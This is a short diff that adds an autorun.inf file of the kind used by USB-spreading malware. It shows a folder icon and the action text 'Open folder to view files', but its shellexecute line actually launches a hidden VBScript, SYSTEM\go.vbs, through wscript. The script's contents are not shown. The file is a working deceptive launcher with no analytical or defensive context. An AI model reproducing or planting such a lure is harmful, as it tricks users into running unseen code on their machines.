@@ -1,0 +1,4 @@
+[autorun] 
+icon=SYSTEM\folder.ico
+action=Open folder to view files
+shellexecute=wscript SYSTEM\go.vbs
